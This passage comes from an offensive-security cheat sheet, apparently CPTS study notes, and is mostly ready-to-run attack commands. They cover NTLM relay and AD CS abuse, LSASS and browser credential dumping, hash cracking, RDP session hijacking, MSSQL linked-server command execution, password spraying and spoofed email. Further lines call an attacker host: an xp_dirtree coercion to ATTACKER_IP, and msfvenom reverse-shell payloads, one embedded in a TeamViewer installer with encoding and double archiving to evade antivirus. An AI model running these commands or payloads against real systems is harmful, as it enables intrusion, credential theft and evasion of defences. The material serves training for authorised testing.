impacket-ntlmrelayx -t ldaps://DC_IP --no-wcf-server --escalate-user "relay_user"

# Relay to ADCS web enrollment
impacket-ntlmrelayx -t http://CA_SERVER/certsrv/certfnsh.asp -smb2support --adcs
```

### MSSQL xp_dirtree Forced Auth
```sql
EXEC master..xp_dirtree '\\ATTACKER_IP\share'
-- Forces SQL service account to authenticate to your SMB server
```

### Full Attack Chain
1. `impacket-ntlmrelayx -t ldaps://DC --escalate-user relay_user`
2. Coerce auth via PetitPotam, PrinterBug, or xp_dirtree
3. ntlmrelayx relays to LDAP and escalates relay_user
4. Attacker now has escalated privileges

## AD CS Attacks

### ESC8 — NTLM Relay to ADCS Web Enrollment
```bash
impacket-ntlmrelayx -t http://CA_SERVER/certsrv/certfnsh.asp -smb2support --adcs
# Coerce auth → get certificate → authenticate with cert
```

### Shadow Credentials
Write to `msDS-KeyCredentialLink` → authenticate via PKINIT:
```bash
python3 PKINITtools/gettgtpkinit.py -cert-pfx shadow.pfx -pfx-pass PASS DOMAIN/target out.ccache
export KRB5CCNAME=out.ccache
impacket-psexec -k -no-pass domain/target@target
```

### PassTheCert
```bash
certipy auth -pfx certificate.pfx -dc-ip DC_IP -domain DOMAIN
# Windows:
Rubeus.exe asktgt /user:target /certificate:cert.pfx /password:cert_password
```

### Certipy
```bash
certipy find -u user@domain -p pass -dc-ip DC_IP
certipy req -ca "CA_NAME" -template "User" -u user@domain -p pass
certipy auth -pfx user.pfx -dc-ip DC_IP
```

## Linux Credential Hunting

| Tool | Command | Description |
|------|---------|-------------|
| **Mimipenguin** | `sudo ./mimipenguin.sh` | Dump passwords from memory (Mimikatz for Linux) |
| **LaZagne** | `laazagne all` / `laazagne browsers` / `laazagne ssh` | Extract stored credentials |
| **Linikatz** | `python3 linikatz.py` | Extract credentials from Linux |
| **Firefox Decrypt** | `python3 firefox_decrypt.py /path/to/profile` | Decrypt Firefox saved passwords |

### KeyTab Files
```bash
find / -name "*.keytab" 2>/dev/null
klist -k -t -K -e /path/to/keytab
```

### ccache Files
```bash
find / -name "*.ccache" -o -name "krb5cc_*" 2>/dev/null
echo $KRB5CCNAME
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```

### Common Linux Credential Locations
| File | Contains |
|------|----------|
| `/etc/shadow` | Password hashes |
| `~/.bash_history` | Command history (may contain passwords) |
| `~/.ssh/id_rsa` | SSH private keys |
| `~/.gnupg/` | GPG keys |
| `/etc/krb5.keytab` | Kerberos keytab |
| `~/.mozilla/firefox/` | Browser credentials |
| `~/.aws/credentials` | AWS credentials |
| `~/.kube/config` | Kubernetes credentials |

## Windows Credential Hunting

### Windows Credential Manager
```cmd
cmdkey /list                                      # Show saved credentials
runas /savecred /user:Administrator cmd.exe       # Use saved creds
mimikatz # sekurlsa::credman                     # Dump Credential Manager
```

### DPAPI
- Encrypts: browser passwords, RDP files, WiFi keys
- Requires: user's master key (derived from password) or SYSTEM access
- Tools: DonPAPI, Hekatomb

### LSASS Memory Dump — CLI Methods
```cmd
# rundll32 (no tool required)
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <LSASS_PID> C:\Users\Public\lsass.dmp full

# Parse with pypykatz
pypykatz lsa minidump lsass.dmp
```

### Mimikatz Direct
```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

### Network Traffic Credential Capture
```bash
sudo tcpdump -i tun0 -w capture.pcap
# Analyze in Wireshark for cleartext: FTP(21), HTTP Basic(80), Telnet(23), IMAP(143), POP3(110), SNMP(161)
```

### Network Share Credential Pillaging
```cmd
Snaffler.exe -s -d DOMAIN -o snaffler.log
# Searches for: passwords, keys, config files, SSH keys, certificates
```

Manual search targets: `*.config`, `*.xml`, `*.ini`, `*.conf`, `*.yml`, `id_rsa`, `authorized_keys`, `known_hosts`

## Hashcat Comprehensive

### Common Modes
| Hash Type | Mode | Hash Type | Mode |
|-----------|------|-----------|------|
| NTLM | 1000 | Net-NTLMv2 | 5600 |
| Kerberos TGS-REP | 13100 | AS-REP | 18200 |
| DCC2 | 2100 | MD5 | 0 |
| SHA1 | 100 | SHA256 | 1400 |
| SHA512 | 1700 | bcrypt | 3200 |
| WPA2 | 22000 | ZIP | 13600 |
| PDF | 10500 | 7-Zip | 11600 |
| RAR5 | 13000 | SSH keys | 22921 |
| KeePass | 13400 | | |

### Rule-Based Attacks
```bash
hashcat -m 1000 hash.txt rockyou.txt -r rules/best64.rule
# Custom rules: create .rule files with directives (c, u, l, $1, ^1, @, d, p, T, {, })
```

### Combinator Attacks
```bash
hashcat -m 1000 hash.txt dict1.txt dict2.txt -a 1
```

### Mask Attacks
```bash
hashcat -m 1000 hash.txt -a 3 ?u?l?l?l?d?d?d?d
```

### Session Management
```bash
hashcat -m 1000 hash.txt wordlist.txt --session mysession
hashcat --session mysession --restore
```

## John the Ripper

```bash
# Basic
john --format=NT hash.txt

# Wordlist
john --format=NT --wordlist=rockyou.txt hash.txt

# Rules
john --format=NT --wordlist=rockyou.txt --rules=Jumbo hash.txt

# Incremental mode
john --format=NT --incremental=Alpha hash.txt

# Show results
john --show hash.txt

# Convert to JTR format
hashcat2john, keepass2john, zip2john, rar2john, ssh2john
```

## Custom Wordlist Generation
```bash
cupp -i                              # Interactive profile-based
cewl -d 3 -m 5 -w output.txt URL    # Scrape website for words
username-anarchy                     # Generate username combos from names
```

## Protected File Cracking
| File | Tool | Hashcat Mode |
|------|------|-------------|
| ZIP | `zip2john file.zip > hash.txt` | 13600 |
| PDF | `pdf2john file.pdf > hash.txt` | 10500 |
| SSH keys | `ssh2john id_rsa > hash.txt` | 22921 |
| KeePass | `keepass2john file.kdbx > hash.txt` | 13400 |
| 7-Zip | `7z2john file.7z > hash.txt` | 11600 |
| RAR | `rar2john file.rar > hash.txt` | 13000 |

## BloodHound
```cmd
# Windows — SharpHound
SharpHound.exe -c All -d DOMAIN

# Azure AD — AzureHound
AzureHound for Azure AD enumeration

# Cypher queries
MATCH (u:User {admincount:true}) RETURN u
# Shortest path to Domain Admin
```

## LDAP Enumeration
```bash
# Anonymous bind
ldapsearch -x -H ldap://DC_IP -b "DC=domain,DC=local"

# windapsearch
windapsearch --dc-ip DC_IP -d domain.local -u user -p pass --users --groups --computers

# PowerView (PowerShell)
Get-DomainUser, Get-DomainComputer, Get-DomainGroup, Get-ObjectAcl
```

## Kerberos Pre-auth Stealth
**Kerbrute doesn't trigger Event ID 4625** (failed logon) because it only tests pre-auth, not actual authentication. Much stealthier than password spraying.


---

# Phase 12: Password Cracking — Deep Techniques

## 12.1 John The Ripper

### Basic Usage
```bash
# Auto-detect format and crack
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Specify format
john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Show cracked passwords
john hashes.txt --show

# Rule-based attacks (apply mangling rules to wordlist)
john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --rules

# Incremental mode (brute-force with character set optimizations)
john --format=NT hashes.txt --incremental=Alphanumeric
```

### Custom Rules
```bash
# Edit /etc/john/john.conf or create custom.rule
# Common rules: append numbers, capitalize, leet speak
# Then apply:
john --rules=custom.rule --format=NT hashes.txt --wordlist=passwords.txt
```

## 12.2 Hashcat — Comprehensive Usage

### Mode Reference (Critical Hash Types)
| Mode | Hash Type | Source |
|------|-----------|--------|
| 1000 | NTLM | Windows SAM, NTDS.dit, LSASS |
| 2100 | DCC2 (Domain Cached Credentials v2) | Windows SYSTEM/SECURITY hives |
| 5600 | NetNTLMv2 | Responder, MITM captures |
| 13100 | Kerberos TGS-REP (RC4-HMAC) | Kerberoasting |
| 18200 | Kerberos AS-REP (RC4-HMAC-ET) | AS-REP Roasting |
| 19700 | PuTTY Private Key (.ppk) | SSH key files |
| 22911 | RSA/DSA/EC/OpenSSH Private Keys ($0$) | SSH key files |
| 16200 | Apple Secure Notes | Apple keychain |

### Rule-Based Attacks
```bash
# Apply best64 rules (industry-standard mangling rules)
hashcat -m 1000 hashes.txt -r /usr/share/hashcat/rules/best64.rule /usr/share/wordlists/rockyou.txt

# Custom rules file
hashcat -m 1000 hashes.txt -r custom.rule wordlist.txt

# Combinator attack (combine two wordlists)
hashcat -m 1000 hashes.txt -a 1 wordlist1.txt wordlist2.txt

# Mask attack (targeted brute-force with pattern)
hashcat -m 1000 hashes.txt -a 3 ?u?l?l?l?d?d?d?d    # Uppercase + 3 lowercase + 4 digits
```

## 12.3 Custom Wordlist Generation

### Username Generation
```bash
# Username Anarchy — convert real names to username formats
./username-anarchy -i names.txt
# Outputs: jsmith, john.smith, j.smith, smithj, etc.

# linkedin2username — scrape LinkedIn, generate username combinations
# Uses patterns: flast, first.last, f.last, firstlast
```

### Targeted Wordlists
```bash
# CeWL — generate wordlist from website content
cewl http://target.com -w target_words.txt -d 3 -m 6

# CUPP — create wordlist from personal information
python3 cupp.py -i    # Interactive mode — enter known info about target

# Password pattern analysis from breached credentials
# If you find: user1:Summer2023!, user2:Winter2024!
# Pattern: <Season><Year>! → generate variants
```

## 12.4 Protected File Cracking

```bash
# ZIP files
john --format=ZIP zip_file.zip --wordlist=rockyou.txt
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt file.zip

# PDF files
pdf2john.pl protected.pdf > pdf_hash.txt
john --format=PDF pdf_hash.txt --wordlist=rockyou.txt

# SSH private keys
ssh2john.py id_rsa > ssh_hash.txt
john --format=SSH ssh_hash.txt --wordlist=rockyou.txt

# KeePass databases
keepass2john Database.kdbx > kp_hash.txt
hashcat -m 13400 kp_hash.txt rockyou.txt

# 7-Zip archives
7z2john.pl protected.7z > 7z_hash.txt
hashcat -m 11600 7z_hash.txt rockyou.txt
```

---

# Phase 13: Credential Hunting — Systematic Approaches

## 13.1 Linux Credential Hunting

### Mimipenguin — Linux Mimikatz Equivalent
```bash
# Dump plaintext passwords from Linux memory
sudo python3 mimipenguin.py
# OR
sudo bash mimipenguin.sh
```
> Works by extracting credentials from memory for gdm, gnome-keyring, VSFTPd, OpenSSH, and Apache2 processes.

### LaZagne — Multi-Application Credential Extraction
```bash
# Extract credentials from 35+ applications (browsers, WiFi, sysadmin tools, etc.)
python2.7 laZagne.py all

# Specific modules
python3 laZagne.py browsers
python3 laZagne.py wifi
python3 laZagne.py sysadmin
```

### Linikatz — "Mimikatz for Unix"
> Extracts credentials from FreeIPA, SSSD, Samba, and Vinteca Kerberos implementations on Linux.

```bash
# Download and run
python3 linikatz.py --dump
```

### KeyTab File Abuse
```bash
# Find keytab files
find / -name *.keytab 2>/dev/null
find / -name *.keytab -ls 2>/dev/null

# Extract NTLM, AES-256, and AES-128 hashes
git clone https://github.com/zyn3rgy/KeyTabExtract.git
python3 keytabextract.py service.keytab

# Impersonate any principal in the keytab
kinit -kt service.keytab service@INLANEFREIGHT.LOCAL
klist    # verify ticket
```

### Kerberos Ccache File Abuse
```bash
# Find credential cache files
find /tmp -name "krb5cc*" 2>/dev/null
ls -la /tmp/krb5cc_*

# Check the contents
export KRB5CCNAME=/tmp/krb5cc_1000
klist    # shows the principal (user) and ticket validity

# Impersonate the ticket owner — even Domain Admins
python3 secretsdump.py -just-dc -k -no-pass "DC01$"@DC01.INLANEFREIGHT.LOCAL
```

### Firefox Decrypt — Browser Credential Extraction
```bash
# Locate Firefox profile
ls -l ~/.mozilla/firefox/ | grep default
cat ~/.mozilla/firefox/1bplpd86.default-release/logins.json | jq .

# Decrypt saved credentials
git clone https://github.com/unode/firefox_decrypt.git
python3.9 firefox_decrypt.py
```

### File-Based Credential Searches
```bash
# Search for config files
for l in $(echo ".conf .config .cnf"); do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core"; done

# Search for passwords in config files
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib"); do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#"; done

# Search for databases
for l in $(echo ".sql .db .*db .db*"); do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man"; done

# Search for scripts
for l in $(echo ".py .pyc .pl .go .jar .c .sh"); do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share"; done

# Enumerate cronjobs
cat /etc/crontab

# Enumerate history files
tail -n5 /home/*/.bash*

# Enumerate log files for auth events
for i in $(ls /var/log/* 2>/dev/null); do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND=\|logs" $i 2>/dev/null); if [[ $GREP ]]; then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND=\|logs" $i 2>/dev/null; fi; done
```

## 13.2 Windows Credential Hunting

### LSASS Memory Dump — CLI Methods
```cmd
# Find LSASS PID
tasklist /svc | findstr lsass
# OR in PowerShell:
Get-Process lsass

# Create dump file via rundll32 (flagged by modern AV)
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full

# Extract credentials with pypykatz (Linux)
pypykatz lsa minidump /home/attacker/lsass.dmp

# Extract credentials with Mimikatz (Windows)
mimikatz.exe privilege::debug "sekurlsa::logonpasswords" exit
```

> **WDIGEST Note:** On older Windows systems, LSASS caches WDIGEST credentials in cleartext. Modern Windows (8.1+) disables WDIGEST by default.

### Windows Credential Manager
```cmd
# List stored credentials
cmdkey /list

# Run as a different user with stored credentials
runas /savecred /user:INLANEFREIGHT\administrator cmd.exe

# Mimikatz — decrypt Credential Manager passwords
mimikatz.exe privilege::debug "sekurlsa::credman" exit
```

### DPAPI (Data Protection API) Extraction
> DPAPI encrypts stored credentials for Chrome/Edge saved passwords, RDP files, WiFi credentials, and more. The masterkey is protected by the user's password hash.

```bash
# From a Windows host with user context:
# Chrome/Edge passwords are encrypted with DPAPI
# Extract with LaZagne:
python3 laZagne.py browsers

# Mimikatz — extract DPAPI masterkeys
mimikatz.exe privilege::debug "dpapi::masterkeys" exit
```

### Network Share Credential Pillaging
```bash
# Snaffler — automated credential search across AD shares
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data

# CrackMapExec — spider shares
netexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
# Results written to /tmp/cme_spider_plus/<ip>

# Manual search — common file types
# .xml, .config, .cnf, .txt, .ps1, .bat, .xls, .docx
# Look for: password=, pwd=, connection string, API key
```

### Network Traffic Credential Capture
```bash
# Capture traffic with tcpdump
sudo tcpdump -i tun0 -w capture.pcap

# Filter for cleartext protocols (FTP, HTTP, Telnet, SMTP)
sudo tcpdump -i tun0 -A port 21    # FTP
sudo tcpdump -i tun0 -A port 80    # HTTP
sudo tcpdump -i tun0 -A port 23    # Telnet

# Analyze in Wireshark
# File → Export Objects → HTTP → extract files/credentials
# Follow TCP Stream → look for AUTH, LOGIN, PASS commands
```

### Session Information Extraction
```bash
# SessionGopher — Extract saved sessions from PuTTY, WinSCP, SuperPuTTY, FileZilla, RDP
Invoke-SessionGopher -Thorough
```

---

# Phase 14: Service-Specific Advanced Attacks

## 14.1 DNS Attacks

### DNS Cache Poisoning (Ettercap)
```bash
# Step 1 — Edit etter.dns to map target domain to attacker IP
# Edit /etc/ettercap/etter.dns:
# inlanefreight.com    A    192.168.225.110

# Step 2 — Start Ettercap, scan for hosts
# Hosts → Scan for Hosts
# Add victim IP to Target1
# Add default gateway to Target2

# Step 3 — Activate dns_spoof plugin
# Plugins → Manage Plugins → enable dns_spoof
```
> Same attack can be performed with Bettercap. Victims are redirected to attacker-controlled web server when they type the target domain.

### Subdomain Takeover
```bash
# Identify dangling CNAME records
host support.inlanefreight.com
# support.inlanefreight.com is an alias for inlanefreight.s3.amazonaws.com

# Browse the URL — if you get NoSuchBucket error, it's vulnerable
# Takeover: create an AWS S3 bucket with the same name
```
> Reference: [can-i-take-over-xyz](https://github.com/EdOverflow/can-i-take-over-xyz)

## 14.2 FTP Bounce Attacks
```bash
# Use FTP PORT command to trick FTP server into scanning/connecting to other devices
nmap -Pn -v -n -p80 -b <ftp_server> <target>
```
> The FTP server acts as a proxy, allowing indirect port scanning and access to otherwise unreachable hosts.

## 14.3 RDP Session Hijacking
```cmd
# View active RDP sessions
query user

# Hijack a user's session (requires SYSTEM/Administrator)
tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}

# Alternative — create a Windows service (does not work on Server 2019)
sc create sessionhijack binpath= "tscon 4 /dest:rdp-tcp#13"
net start sessionhijack
```
> The hijacked session runs as the original user — no password needed. Useful for accessing user-specific resources or applications.

## 14.4 MSSQL Linked Server Abuse + Impersonation Chain

### Full Attack Chain
```bash
# Connect to MSSQL with credentials
mssqlclient.py -p 1433 fiona@10.129.203.10 -windows-auth
```

```sql
-- Check impersonation privileges
SELECT distinct b.name FROM sys.server_permissions a
JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- Impersonate a user
EXECUTE AS LOGIN = 'john';
SELECT SYSTEM_USER;    -- verify impersonation

-- Query linked server
EXECUTE ('SELECT SYSTEM_USER') AT [LOCAL.TEST.LINKED.SRV];

-- Enable xp_cmdshell on linked server
EXECUTE ('EXECUTE sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [LOCAL.TEST.LINKED.SRV];
EXECUTE ('EXECUTE sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LOCAL.TEST.LINKED.SRV];

-- Execute OS commands as SYSTEM on linked server
EXECUTE ('EXECUTE master..xp_cmdshell ''whoami''') AT [LOCAL.TEST.LINKED.SRV];

-- Reset Administrator password
EXECUTE ('EXECUTE master..xp_cmdshell ''net user Administrator NewPass123!''') AT [LOCAL.TEST.LINKED.SRV];
```

## 14.5 Cloud Email — O365spray

```bash
# Validate domain
python3 o365spray.py --validate --domain msplaintext.xyz

# Enumerate valid usernames
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz

# Password spray (respect lockout thresholds)
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```

## 14.6 Open Relay Abuse for Phishing
```bash
# Check for open relay
nmap -p25 -Pn --script smtp-open-relay 10.10.11.213

# If vulnerable — send spoofed emails
swaks --from spoofed@target.com --to victim@target.com \
  --header 'Subject: Test' --body 'message' --server <ip>
```

---

# Phase 15: Metasploit — Advanced Techniques & Evasion

## 15.1 Database Integration
```bash
# Initialize database
sudo systemctl start postgresql
msfdb init
sudo msfdb run          # Connect and run Metasploit with database

# Import scan results
msf6 > db_import Target.xml

# Use nmap within MSFConsole (results auto-import to database)
db_nmap -sV -sS 10.10.10.8

# Workspaces for multi-target engagements
workspace -a Target_1
workspace Target_1      # switch to workspace

# Data backup
db_export -f xml backup.xml

# Global set — persist target across modules
setg RHOSTS 10.10.10.40    # applies to ALL modules
```

## 15.2 Payload Architecture

| Type | Description | Example |
|------|-------------|---------|
| **Singles** | Self-contained payload, no staging | `windows/shell_bind_tcp` |
| **Stagers** | Establish connection (small, reliable) | `bind_tcp` |
| **Stages** | Downloaded component — advanced features (Meterpreter, VNC) | `shell` in `windows/shell/bind_tcp` |

**Staged notation:** `windows/shell/bind_tcp` (uses `/` separator)
**Stageless notation:** `windows/shell_bind_tcp` (uses `_` separator)

> Staged payloads are better for RWX memory allocation. A single `recv()` fails with large payloads; the stager receives a middle stager that handles the full download.

## 15.3 Encoder Understanding & Limitations

```bash
# View available encoders for a payload
show encoders

# Modern encoders (x64):
# x64/xor — XOR encoder
# x64/xor_dynamic — Dynamic key XOR encoder
# x64/zutto_dekiru — Zutto Dekiru encoder
```

> **Critical:** Single iteration SGN encoding is **detected by modern AV**. Multiple iterations also get detected. Encoding alone is insufficient for evasion — combine with embedding, archiving, or custom packers.

## 15.4 AV Evasion — Binary Embedding
```bash
# Inject payload into legitimate executable (keeps original app running in separate thread)
msfvenom -p windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
```

| Flag | Purpose |
|------|---------|
| `-k` | Keep original application running in separate thread (critical for stealth) |
| `-x` | Template executable to inject into |
| `-e` | Encoder |
| `-i 5` | Encoding iterations |
| `-a x86` | Architecture |

## 15.5 AV Evasion — Password-Protected Double Archiving
```bash
# Step 1: Install RAR
wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
tar -xzvf rarlinux-x64-612.tar.gz && cd rar

# Step 2: Archive payload with password
rar a ~/payload.rar -p ~/payload.exe

# Step 3: Remove the .RAR extension
mv payload.rar payload

# Step 4: Double-archive (nest inside another password-protected archive)
rar a ~/payload2.rar -p payload
mv payload2.rar payload2
```

> **Rationale:** AV cannot scan password-protected archives. However, this may trigger warnings: "AV was not able to scan the password protected file."

## 15.6 Meterpreter DLL Injection & Persistence

> Meterpreter uses **DLL injection** to ensure stable connections to the victim host. The injected DLL runs within a legitimate process, making detection difficult via simple process checks. It can be configured to be **persistent across reboots or system changes**.

```bash
# In Meterpreter session:
search -f flag.txt    # Native file search through Meterpreter
```

## 15.7 Local Exploit Suggester (Post-Exploitation PrivEsc)
```
# Background the Meterpreter session: Ctrl+Z or background
msf6 > search local_exploit_suggester
msf6 > use 0
msf6 exploit(...) > set session 1
msf6 exploit(...) > run

# Review suggested exploits — select working ones
# Configure LHOST and other fields, execute to escalate privileges
```

## 15.8 Plugin Management
```
# Plugin directory: /usr/share/metasploit-framework/plugins
load nessus    # Load the Nessus plugin
```

## 15.9 Session & Job Management
```
# List sessions
sessions -l

# Interact with session
sessions -i 1

# Background a session
Ctrl+Z or background

# List background jobs
jobs

# Terminate jobs (frees ports — cleaner than Ctrl+C)
jobs -K
```


### AD Security Auditing Tools
```bash
# PingCastle — AD security assessment (CMMI-like risk model)
PingCastle.exe --healthcheck --server DC_IP

# Group3r — GPO misconfiguration auditor
Group3r.exe -f C:\output\report.html
```


---

## SUPPLEMENTARY: Metasploit — Advanced Reference

# ADDENDUM 01: Metasploit — Advanced Techniques

## Metasploit Database Integration

### Database Setup
```bash
msfdb init          # Initialize database
msfdb run           # Start Metasploit with database
msfdb status        # Check database status
msfdb reinit        # Reinitialize if issues
```

### Database Commands
```bash
msf6 > db_status                        # Check connection
msf6 > db_import /path/to/scan.xml      # Import Nmap scan (.xml preferred)
msf6 > db_nmap -sS -sV -oA scan IP     # Run Nmap (auto-imports)
msf6 > db_connect user:pass@host/db    # Connect to database
msf6 > db_disconnect                    # Disconnect

# Hosts
msf6 > hosts                            # List all hosts
msf6 > hosts -u                         # Up only
msf6 > hosts -c address,os_name        # Specific columns
msf6 > hosts -R                         # Set RHOSTS from results
msf6 > hosts -o hosts.csv              # Export CSV
msf6 > hosts -S Windows                # Search
msf6 > hosts -a IP -o Windows -n name  # Add/modify host

# Services
msf6 > services                         # All services
msf6 > services -p 445                  # Filter by port
msf6 > services -s smb                  # Filter by name
msf6 > services -R                      # Set RHOSTS from results
msf6 > services -a -p 445 -s smb IP   # Add service

# Credentials
msf6 > creds                            # List all
msf6 > creds -u admin                   # Filter by user
msf6 > creds -p 445                     # Filter by port
msf6 > creds -t hash                    # Filter by type
msf6 > creds -P password123            # Filter by password string
msf6 > creds -o creds.csv              # Export CSV
msf6 > creds -j                         # Export JTR format (bf, bsdi, des, md5, sha256, sha512, mssql, mysql, oracle, postgres)
msf6 > creds -H                         # Export Hashcat format

# Loot
msf6 > loot                             # List all
msf6 > loot -t hash                     # Filter by type
msf6 > loot -a -f /path/to/file -t hash -i IP  # Add loot

# Export/Backup
msf6 > db_export -f xml backup.xml      # Export XML
msf6 > db_export -f pwdump hashes.txt  # Export pwdump
```

### Workspace Management
```bash
msf6 > workspace              # List
msf6 > workspace -a target1   # Add
msf6 > workspace target1      # Switch
msf6 > workspace -d target1   # Delete
msf6 > workspace -D           # Delete ALL
msf6 > workspace -r old new   # Rename
msf6 > workspace -v           # Verbose
```

### Global Set (setg)
```bash
msf6 > setg LHOST 10.10.x.x           # Global LHOST
msf6 > setg RHOSTS 10.129.x.x        # Global RHOSTS
msf6 > setg Proxies socks4:127.0.0.1:9050  # Global proxy
# Persists until MSF restart
```

### Advanced Search
```bash
msf6 > search eternalblue -o results.csv   # CSV export
msf6 > search -S meterpreter               # Regex filter
msf6 > search -u eternalblue               # Auto-use if one result
msf6 > search -r -s rank                   # Reverse sort by rank
msf6 > grep meterpreter show payloads      # Grep within msfconsole
msf6 > grep -c meterpreter show payloads   # Count matches
```

**Search columns:** aka, author, arch, bid, cve, edb, check, date, description, fullname, mod_time, name, path, platform, port, rank, ref, reference, target, type

### Sessions & Jobs Management
```bash
# Sessions
msf6 > sessions -l              # List
msf6 > sessions -i 1            # Interact
msf6 > sessions -k 1            # Kill
# Background: [CTRL]+[Z] or type 'background'

# Jobs
msf6 > jobs -l                  # List
msf6 > jobs -K                  # Kill ALL
msf6 > kill 0                   # Kill specific
msf6 > exploit -j               # Run exploit as background job
```

### Plugin System
```bash
# Directory: /usr/share/metasploit-framework/plugins/
msf6 > load <plugin_name>
msf6 > load nessus
msf6 > nessus_connect user:pass@localhost:8834
msf6 > nessus_help

# Key plugins: nessus, nexpose, openvas, sqlmap, wmap
# Community: DarkOperator's Metasploit-Plugins
```

### File System Layout
```
/usr/share/metasploit-framework/
├── Data/           # Wordlists, templates
├── Documentation/  # Guides, API docs
├── Lib/            # Core Ruby libraries
├── Modules/        # Auxiliary, Encoders, Evasion, Exploits, NOPs, Payloads, Post
├── Plugins/        # Ruby plugin files
├── Scripts/        # Meterpreter, PS, Resource, Shell scripts
└── Tools/          # Context, Dev, Exploit, Hardware, Memdump, Modules, Password, Payloads, Recon
```

### Module Naming Convention
`<No.> <type>/<os>/<service>/<name>` — e.g., `exploit/windows/smb/ms17_010_eternalblue`

**Module Types:**
| Type | Purpose | Interactable? |
|------|---------|--------------|
| Auxiliary | Scanning, fuzzing, sniffing, admin | YES (`use <no.>`) |
| Exploit | Vulnerability exploitation | YES (`use <no.>`) |
| Post | Info gathering, pivoting, post-exploitation | YES (`use <no.>`) |
| Encoders | Payload integrity, bad character removal | NO |
| NOPs | Consistent payload sizes | NO |
| Payloads | Callback code | NO |
| Plugins | Additional scripts/framework integration | NO |

### Mixins
Ruby classes that act as methods for other classes without being parent classes. Implemented with `include` keyword. Used for optional features and shared functionality across modules.

### Banner Information
Metasploit banner shows: exploit count, auxiliary count, post count, payload count, encoder count, nop count, evasion count. Changes as modules are added/removed.
```bash
msfconsole -q    # Quiet mode, suppresses banner
```

### Target Types and Return Addresses
Targets vary by: service pack, OS version, language version. Return addresses use `jmp esp`, `pop/pop/ret`. Language packs change addresses. Use `msfpescan` to locate return addresses.

### Encoders Architecture

**Available Encoders:**
| Architecture | Encoders |
|-------------|----------|
| x64 | generic/eicar, generic/none, x64/xor, x64/xor_dynamic, x64/zutto_dekiru |
| x86 | alpha_mixed, alpha_upper, avoid_utf8_tolower, call4_dword_xor, context_cpuid, context_stat, context_time, countdown, fnstenv_mov, jmp_call_additive, nonalpha, nonupper, shikata_ga_nai, single_static_bit, unicode_mixed, unicode_upper |

**Shikata Ga Nai (SGN):**
- "It cannot be helped" — polymorphic XOR additive feedback encoder
- Ranked "excellent"
- **Reality check:** 1 iteration = ~54/69 detected; 10 iterations = ~52/65 detected
- Each iteration increases payload size
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe > payload.exe
```

**Encoder Ranking:** manual < low < normal < excellent

**VirusTotal Integration:** `msf-virustotal` tool (requires free VT registration + API key)

**Key insight:** Encoders do NOT provide meaningful AV evasion against modern defenses. Use proper evasion techniques instead.

### Empire and Cobalt Strike
Professional penetration testing tools for high-value target assessments. Out of scope for CPTS but recommended for research.

### MSF Engagement Structure
Five categories: Enumeration (Service Validation, Vulnerability Research), Preparation (Code Auditing), Exploitation (Module Execution), Privilege Escalation, Post-Exploitation (Pivoting, Data Exfiltration)

### msfupdate Deprecated
Old method was `msfupdate`; now handled by `apt update && apt install metasploit-framework`

### Metasploit Pro vs Framework
Pro features: AV Evasion, IPS/IDS Evasion, Social Engineering, Phishing Wizard, Nexpose Integration, Task Chains, Web Interface, Team Collaboration, Reporting, Evidence Collection, Backup/Restore, Data Export


---

# Phase 16: Nmap Firewall & IDS/IPS Evasion

## 16.1 Fragmentation
```bash
# Fragment packets (split into 8-byte fragments)
sudo nmap -f $IP

# Fragment with custom MTU
sudo nmap --mtu 16 $IP
```

## 16.2 Decoys
```bash
# Use decoy IPs to obscure your real source
sudo nmap -D RND:10 $IP          # 10 random decoys
sudo nmap -D 192.168.1.100,ME $IP    # specific decoy + your IP
```

## 16.3 Timing & Source Port Manipulation
```bash
# Slow down scan to avoid detection
sudo nmap -T1 $IP

# Use common source port (may bypass naive firewall rules)
sudo nmap --source-port 53 $IP    # DNS port
sudo nmap --source-port 80 $IP    # HTTP port
sudo nmap --source-port 88 $IP    # Kerberos port
```

## 16.4 Script & Scan Evasion
```bash
# Bad sum — detect IDS/IPS with crafted packets
sudo nmap --badsum $IP

# Append random data to probes
sudo nmap --data-length 25 $IP

# Custom TTL values
sudo nmap --ttl 10 $IP
```

---

# Phase 17: Reporting, Cleanup & Documentation

## 17.1 "I'm Stuck" Recovery Loop

When you hit a wall:

1. **Re-enumerate:** Check for missed ports, sub-directories, or parameters
2. **Configuration Review:** Search for `wp-config.php`, `web.config`, `.env`, or hardcoded creds in `/etc/hosts`
3. **Local Services:** Identify services listening on `127.0.0.1` and pivot to them
